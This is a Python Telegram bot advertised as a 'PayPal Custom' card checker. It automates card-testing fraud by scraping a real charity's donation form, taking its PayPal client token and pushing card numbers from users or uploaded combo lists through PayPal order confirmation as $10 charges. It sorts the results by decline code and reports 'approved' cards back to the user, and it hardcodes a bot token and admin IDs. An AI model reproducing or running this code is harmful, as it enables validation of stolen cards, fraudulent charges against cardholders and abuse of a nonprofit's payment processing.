import telebot
import time
import threading, cloudscraper
from telebot import types
import requests, random, os, pickle, time, re
from bs4 import BeautifulSoup

# توكن البوت
token = '7545888216:AAGC6AyVVgqjxo611StXeB_QEqKvoW7sfCw'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ايدي حسابك
admin = 1093032296
myid = ['1093032296']
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))


@bot.message_handler(commands=["start"])
def handle_start(message):
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id,
                          message_id=sent_message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
                          reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    name = call.from_user.first_name

    bot.send_message(call.message.chat.id, 
        '''- مرحباً بك في بوت فحص بايبال كوستم 😡


للفحص اليدوي للاوث [/pp] و للكومبو فقط ارسل الملف.


اختر نوع الفحص وسيبدأ البوت بأعطائك افضل النتائج مع علاوي الاسطوره @B11HB''')


    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Paypal)",
                          reply_markup=mes)


#############################
# Getat PayPal Custom
#############################
import requests, re, base64
import requests

def pali(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.Session()
    

    headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US',
	    'cache-control': 'max-age=0',
	    'priority': 'u=0, i',
	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
	}
	
    response1 = r.get(
	    'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
	    headers=headers,
	)
	
    hash = re.search(r'name="give-form-hash" value="(.*?)"', response1.text).group(1)
				
				
    iid = re.search(r'name="give-form-id" value="(.*?)"', response1.text).group(1)
				
				
    prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', response1.text).group(1)
			
    lol = re.search(r'"data-client-token":"(.*?)"', response1.text).group(1)
    kol = base64.b64decode(lol).decode('utf-8')
    la = re.findall(r'"accessToken":"(.*?)"', kol)[0]
	
    headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US',
	    'origin': 'https://gullottahouse.org',
	    'priority': 'u=1, i',
	    'referer': 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
	}
	
    params = {
	    'action': 'give_paypal_commerce_create_order',
	}
	
    data = {
	    'give-fee-amount': (None, '0.7'),
	    'give-fee-mode-enable': (None, 'false'),
	    'give-fee-status': (None, 'enabled'),
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, prefix),
	    'give-form-id': (None, iid),
	    'give-form-title': (None, "JP Doyle's Spaghetti Night Fundraiser"),
	    'give-current-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
	    'give-form-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
	    'give-form-minimum': (None, '10.00'),
	    'give-form-maximum': (None, '1000000.00'),
	    'give-form-hash': (None, hash),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    '_give_is_donation_recurring': (None, '0'),
	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
	    'give-amount': (None, '10.00'),
	    'give-recurring-period-donors-choice': (None, 'month'),
	    'give-fee-recovery-settings': (None, '{"fee_data":{"paypal-commerce":{"percentage":"1.990000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"offline":{"percentage":"0.000000","base_amount":"0.000000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}'),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'Haben'),
	    'give_last': (None, 'Nsbe'),
	    'give_email': (None, 'joane73@gmail.com'),
	    'give_comment': (None, ''),
	    'card_name': (None, 'Vaem habe'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	}
	
    response2 = r.post(
	    'https://gullottahouse.org/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
    joker= (response2.json()['data']['id'])
	
    headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US',
	    'authorization': f'Bearer {la}',
	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'paypal-client-metadata-id': 'e456cfee79de4da4d38ad6fef4b59be3',
	    'priority': 'u=1, i',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
	}
	
    json_data = {
	    'payment_source': {
	        'card': {
	            'number': n,
	            'expiry': f'20{yy}-{mm}',
	            'security_code': cvc,
	            'attributes': {
	                'verification': {
	                    'method': 'SCA_WHEN_REQUIRED',
	                },
	            },
	        },
	    },
	    'application_context': {
	        'vault': False,
	    },
	}
	
    response3 = r.post(
	    f'https://cors.api.paypal.com/v2/checkout/orders/{joker}/confirm-payment-source',
	    headers=headers,
	    json=json_data,
	)
	
	
    headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US',
	    'origin': 'https://gullottahouse.org',
	    'priority': 'u=1, i',
	    'referer': 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
	}
	
    params = {
	    'action': 'give_paypal_commerce_approve_order',
	    'order': joker,
	}
	
    data = {
	    'give-fee-amount': (None, '0.7'),
	    'give-fee-mode-enable': (None, 'false'),
	    'give-fee-status': (None, 'enabled'),
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, prefix),
	    'give-form-id': (None, iid),
	    'give-form-title': (None, "JP Doyle's Spaghetti Night Fundraiser"),
	    'give-current-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
	    'give-form-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
	    'give-form-minimum': (None, '10.00'),
	    'give-form-maximum': (None, '1000000.00'),
	    'give-form-hash': (None, hash),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    '_give_is_donation_recurring': (None, '0'),
	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
	    'give-amount': (None, '10.00'),
	    'give-recurring-period-donors-choice': (None, 'month'),
	    'give-fee-recovery-settings': (None, '{"fee_data":{"paypal-commerce":{"percentage":"1.990000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"offline":{"percentage":"0.000000","base_amount":"0.000000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}'),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'Haben'),
	    'give_last': (None, 'Nsbe'),
	    'give_email': (None, 'joane73@gmail.com'),
	    'give_comment': (None, ''),
	    'card_name': (None, 'Vaem habe'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	}
	
    response4 = r.post(
	    'https://gullottahouse.org/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
    
    text = response4.text
    if 'true' in text or 'sucsess' in text:    
        return 'CHARGE 10.00$'
    elif 'DO_NOT_HONOR' in text:
        return "DO_NOT_HONOR"
    elif 'ACCOUNT_CLOSED' in text:
        return "ACCOUNT_CLOSED"
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
    elif 'LOST_OR_STOLEN' in text:
        return "LOST_OR_STOLEN"
    elif 'CVV2_FAILURE' in text:
        return "CVV2_FAILURE"
    elif 'SUSPECTED_FRAUD' in text:
        return "SUSPECTED_FRAUD"
    elif 'INVALID_ACCOUNT' in text:
        return "INVALID_ACCOUNT"
    elif 'REATTEMPT_NOT_PERMITTED' in text:
        return "REATTEMPT_NOT_PERMITTED"
    elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
        return "ACCOUNT_BLOCKED_BY_ISSUER"
    elif 'ORDER_NOT_APPROVED' in text:
        return "ORDER_NOT_APPROVED"
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
        return "PICKUP_CARD_SPECIAL_CONDITIONS"
    elif 'PAYER_CANNOT_PAY' in text:
        return "PAYER_CANNOT_PAY"
    elif 'INSUFFICIENT_FUNDS' in text:
        return "INSUFFICIENT_FUNDS"
    elif 'GENERIC_DECLINE' in text:
        return "GENERIC_DECLINE"
    elif 'COMPLIANCE_VIOLATION' in text:
        return "COMPLIANCE_VIOLATION"
    elif 'TRANSACTION_NOT_PERMITTED' in text:
        return "TRANSACTION_NOT_PERMITTED"
    elif 'PAYMENT_DENIED' in text:
        return "PAYMENT_DENIED"
    elif 'INVALID_TRANSACTION' in text:
        return "INVALID_TRANSACTION"
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
    elif 'SECURITY_VIOLATION' in text:
        return "SECURITY_VIOLATION"
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
    elif 'INVALID_OR_RESTRICTED_CARD' in text:
        return "INVALID_OR_RESTRICTED_CARD"
    elif 'EXPIRED_CARD' in text:
        return "EXPIRED_CARD"
    elif 'CRYPTOGRAPHIC_FAILURE' in text:
        return "CRYPTOGRAPHIC_FAILURE"
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
        return "TRANSACTION_CANNOT_BE_COMPLETED"
    elif 'DECLINED_PLEASE_RETRY' in text:
        return "DECLINED_PLEASE_RETRY_LATER"
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
        return "TX_ATTEMPTS_EXCEED_LIMIT"
    else:
        try:
            result = response4.json()['data']['error']
            return result
        except:
            return "UNKNOWN_ERROR"


#############################
# reg
#############################
def luhn_check(number: str) -> bool:
    """Luhn algorithm to validate card number."""
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0
 
def reg(cc: str):
    """
    Parse card input and return "PAN|MM|YY|CVC" or None if invalid.
    - Supports Amex (15-digit PAN + 4-digit CVC) and standard (16-digit PAN + 3-digit CVC).
    - Accepts inputs like "4340762019462213|9|28|825" or concatenated digits.
    - Ensures MM is two digits (pads with leading zero if needed).
    """
    # First try to split by any non-digit separator (handles |, spaces, -, etc.)
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        # Use first 4 parts as PAN, MM, YY, CVC (ignore extras)
        pan = parts[0]
        mm = parts[1].zfill(2)  # pad month to 2 digits
        yy = parts[2]
        cvc = parts[3]
        # normalize year: if 4-digit like 2026 keep it, if 2-digit keep it
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            # keep 4-digit year
            pass
        elif len(yy) == 1:
            # unlikely, reject
            return None
        # determine card type by pan prefix
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None

        return f"{pan}|{mm}|{yy}|{cvc}"

    # Fallback: try to parse from a long digit string (no separators)
    digits = ''.join(re.findall(r'\d', cc))
    if not digits:
        return None

    # detect amex by prefix
    is_amex = digits.startswith('34') or digits.startswith('37')
    cvc_len = 4 if is_amex else 3

    # need at least pan + mm(2) + yy(2) + cvc
    min_len = (15 if is_amex else 16) + 2 + 2 + cvc_len
    if len(digits) < min_len:
        # maybe year is 4-digit (e.g., 2026) -> check slightly larger
        # but if less than minimal expected, fail
        return None

    # strategy: take cvc from end, then try to detect yy (2 or 4) and mm(2)
    cvc = digits[-cvc_len:]
    rest = digits[:-cvc_len]

    # assume yy is 2 digits normally
    yy_candidate = rest[-2:]
    mm_candidate = rest[-4:-2]
    pan_candidate = rest[:-4]

    # check if year might be 4-digit (starts with 20 or 19)
    if len(rest) >= 6 and rest[-4:-2] in ('20', '19'):
        # treat last 4 of rest as yyyy
        yy = rest[-4:]
        mm = rest[-6:-4]
        pan = rest[:-6]
    else:
        yy = yy_candidate
        mm = mm_candidate
        pan = pan_candidate

    # pad month if needed (in case parsed as single digit somehow)
    mm = mm.zfill(2)

    expected_pan_len = 15 if (pan.startswith('34') or pan.startswith('37')) else 16
    if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
        return None
    if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
        return None
    if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
        return None
    if not re.fullmatch(r'\d{%d}' % cvc_len, cvc):
        return None
    if not luhn_check(pan):
        return None

    return f"{pan}|{mm}|{yy}|{cvc}"


#############################
# BOT
#############################
import threading, random
from datetime import datetime

@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def my_ali4(message):
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {
            'last_time': datetime.now()
        }
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return	
    ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        bran2 = pali
        last = str(bran2(cc))
    except Exception as e:
        last = f'Error {e}'
        
    end_time = time.time()
    execution_time = end_time - start_time
    msg = f'''<strong>#PayPal_Custom 1.00$ 🔥 [/pp]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐬: <code>{'CHARGE 1.00$🔥' if 'CHARGE 1.00$' in last else 'Approved PayPal' if 'INSUFFICIENT_FUNDS' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐜𝐞 : <a href='tg://user?id=8169349350'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")


import random
import time
import threading
import requests
from telebot import types

@bot.message_handler(content_types=('document'))
def GTA(message):
    user_id = str(message.from_user.id)
    name = message.from_user.first_name or message.from_user.username or "User"

    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='PayPal Custom 10.00$', callback_data='ottpa2')
    bts.add(soso)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        passs = 0
        basl = 0
        tote = 0
        filename = f"com{user_id}.txt"
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker PayPal Custom 1.00$. 🤓
        
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @B11HB''')
                    return

                try:
                    start_time = time.time()
                    bran2 = pali
                    last = str(bran2(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passs} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, stop)
                end_time = time.time()
                execution_time = end_time - start_time
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To PayPal Custom 1.00$ ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                    
                n = cc.split("|")[0]
                mm = cc.split("|")[1]
                yy = cc.split("|")[2]
                cvc = cc.split("|")[3].strip()
                
                cc = n + '|' + mm + '|' + yy + '|' + cvc
                msg = f'''<strong>#PayPal_Custom 1.00$ 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐬: <code>{'CHARGE 1.00$🔥' if 'CHARGE 1.00$' in last else 'Approved PayPal' if 'INSUFFICIENT_FUNDS' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐨𝐬: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐤𝐞 : <a href='tg://user?id=8169349350'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃 𝐛: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''

                if 'CHARGE 10.00$' in last or 'INSUFFICIENT_FUNDS' in last:
                    passs += 1
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                else:
                    basl += 1
                time.sleep(14)

        bot.edit_message_text(
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed By PayPal Custom 1.00$ Pro. 🥳
    
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl}
Dev!: @B11HB''')
                    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()				

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass


@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass


def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐭𝐫: <code>{country_name} [ {country_flag} ]</code>'''
        return mn
    except Exception as e:
        print(e)
        return 'No info'


print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)
